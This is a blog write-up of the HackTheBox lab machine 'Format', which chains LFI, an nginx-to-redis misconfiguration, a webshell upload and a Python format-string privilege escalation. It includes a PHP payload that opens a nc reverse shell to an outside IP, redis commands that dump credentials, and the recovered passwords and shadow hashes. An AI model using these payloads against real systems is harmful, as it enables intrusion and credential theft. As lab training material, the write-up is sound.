---
title: Format - HackTheBox
url: https://darkwing.moe/2023/05/15/Format-HackTheBox/
source: 喵喵喵喵
date: 2023-05-16
fetch_date: 2025-10-04T11:36:49.523330
---

# Format - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Format - HackTheBox

# Format - HackTheBox

##### 2023-05-15

#### TOC

1. [1. 基本信息](#基本信息)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 80](#80)
   2. [2.2. 3000](#3000)
3. [3. gitea](#gitea)
4. [4. MicroBlog](#MicroBlog)
   1. [4.1. LFI](#LFI)
   2. [4.2. nginx](#nginx)
   3. [4.3. isPro](#isPro)
5. [5. Pro to webshell](#Pro-to-webshell)
   1. [5.1. getshell](#getshell)
6. [6. redis](#redis)
7. [7. user flag](#user-flag)
8. [8. 提权信息](#提权信息)
9. [9. 提权 & root flag](#提权-amp-root-flag)
   1. [9.1. root flag](#root-flag)
   2. [9.2. shadow](#shadow)
10. [10. 参考资料](#参考资料)

# Format - HackTheBox

2023-05-15

# 基本信息

* <https://app.hackthebox.com/machines/Format>
* 10.10.11.213

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051501.jpg)

# 端口扫描

22,80,3000:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.213 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 14:40 CST Nmap scan report for 10.10.11.213 Host is up (0.10s latency). Not shown: 997 closed tcp ports (conn-refused) PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 c397ce837d255d5dedb545cdf20b054f (RSA) |   256 b3aa30352b997d20feb6758840a517c1 (ECDSA) |_  256 fab37d6e1abcd14b68edd6e8976727d7 (ED25519) 80/tcp   open  http    nginx 1.18.0 |_http-title: Site doesn't have a title (text/html). |_http-server-header: nginx/1.18.0 3000/tcp open  http    nginx 1.18.0 |_http-title: Did not follow redirect to http://microblog.htb:3000/ |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 113.11 seconds ``` |

## 80

直接ip跳转到app，加hosts,资源会加载主域名的，一起加了：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` 10.10.11.213 app.microblog.htb microblog.htb ``` |

是一个Microblog：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051502.jpg)

## 3000

gitea 1.17.3:

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051503.jpg)

# gitea

gitea直接探索可以看到microblog的代码：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051504.jpg)

查看代码发现edit/index.php是从id参数获取文件名，写入txt参数提供的内容，看起来可以任意写文件，然后把id参数的内容即文件名追加写入到order.txt中：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051505.jpg)

然后fetchPage是从order.txt中读取每一行作为文件名，读取内容进行输出，所以这里结合前面的，构成LFI：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051512.jpg)

# MicroBlog

回到blog，注册账号测试创建一个blog，发现是直接分配一个子域名，需要加下hosts：

另外存在自动清理，后续操作要快

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051506.jpg)

## LFI

测试，验证存在LFI：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051507.jpg)

## nginx

利用LFI读取nginx配置文件，发现存在配置错误，结合前面的代码里有redis的socket，典型案例：

* Middleware everywhere and lots of misconfigurations to fix | Detectify Labs
  <https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/>

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051508.jpg)

根据文章我们是可以利用这个配置问题去操作redis

## isPro

回到代码，发现pro用户存在uploads目录，而信息是从redis获取的：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051509.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051510.jpg)

# Pro to webshell

所以首先我们去利用nginx的配置问题操作redis，把我们变成pro用户(响应502是正常的，直接回去刷新即可)：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` curl -X "HSET" http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:miao%20pro%20true%20a/b ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051511.jpg)

## getshell

然后就可以利用任意写文件，写入webshell到uploads目录中：

|  |  |
| --- | --- |
| ``` 1 2 3 ``` | ``` id=/var/www/microblog/miao/uploads/miao.php&header=<%3fphp+echo+shell_exec("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|sh+-i+2>%261|nc+10.10.14.13+4444+>/tmp/f")%3b%3f>  http://miao.microblog.htb/uploads/miao.php ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051513.jpg)

# redis

然后redis中获取信息,得到cooper密码,(shell问题不能交互执行就echo一次执行一条)：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` redis-cli -s /var/run/redis/redis.sock  echo "keys *" | redis-cli -s /var/run/redis/redis.sock echo "type cooper.dooper" | redis-cli -s /var/run/redis/redis.sock echo "hgetall cooper.dooper" | redis-cli -s /var/run/redis/redis.sock  zooperdoopercooper ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051514.jpg)

# user flag

cooper用户ssh登录，得到user flag：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` ssh cooper@10.10.11.213 zooperdoopercooper ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051515.jpg)

# 提权信息

lincense看起来是给blog那边的用户生成pro license的：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051516.jpg)

并且这是一个python程序，可以直接查看代码，根据代码发现我们的用户名被拼接进去,并且后面接的`{license.license}`也算给格式化字符串提示了：

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051517.jpg)

而用户名是从redis获取的，如果我们对其进行修改，那就可以利用Python的格式化字符串：

* Python format string vulnerabilities · Podalirius
  <https://podalirius.net/en/articles/python-format-string-vulnerabilities/>

# 提权 & root flag

通过redis修改用户名,现在ssh连接就可以直接用交互式cli了

小坑，一个用户短时间内只能生成一次license，多次执行要等一会儿或者新建用户

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` redis-cli -s /var/run/redis/redis.sock hset miao username {license.__init__.__globals__}  sudo /usr/bin/license -p miao # 其中secret就是密码，输出很多 unCR4ckaBL3Pa$$w0rd  hset miao1 username {license.__init__.__globals__[secret]} ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051518.jpg)

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051519.jpg)

## root flag

得到的密码就是root密码，直接切过去：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` su - unCR4ckaBL3Pa$$w0rd ``` |

![](https://raw.githubusercontent.com/zjicmDarkWing/images2023/master/2023051520.jpg)

## shadow

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` root:$y$j9T$tYoCSn/hikACa4FLjkFxx/$vg7mvtDQNyfOazsy/RpEgxOzAzSktNbOiJWZkTr9ynD:19443:0:99999:7::: cooper:$y$j9T$ctbv4v7TD6ys.rBW.4sou/$6..9q9HWLzKbpmqzL6R81pVJ.8IFdhDwqqnqlL425x/:19300:0:99999:7::: ``` |

# 参考资料

* Middleware everywhere and lots of misconfigurations to fix | Detectify Labs
  <https://labs.detectify.com/2021/02/18/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/>
* Python format string vulnerabilities · Podalirius
  <https://podalirius.net/en/articles/python-format-string-vulnerabilities/>

> Last updated: 2023-10-09 08:30:41
>
> 水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
>
> [![暗羽](/img/avatar.jpg)
> 暗羽](https://darkwing.moe)

* [HackTheBox](/tags/HackTheBox/)

[Prev

#### PC - HackTheBox](/2023/05/22/PC-HackTheBox/)

[Next

#### OSCE3 Review](/2023/05/15/OSCE3-Review/)

站点总访客数：

站点总访问量：

This blog is licensed under a [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

暗羽 © 2014 - 2025

Power by [Hexo](http://hexo.io/) Theme [indigo](https://github.com/yscoder/hexo-theme-indigo)

扫一扫，分享到微信

![微信分享二维码](data:image/png;base64...)

- [{title}

  {tags}

  {date}](%7Bpath%7D)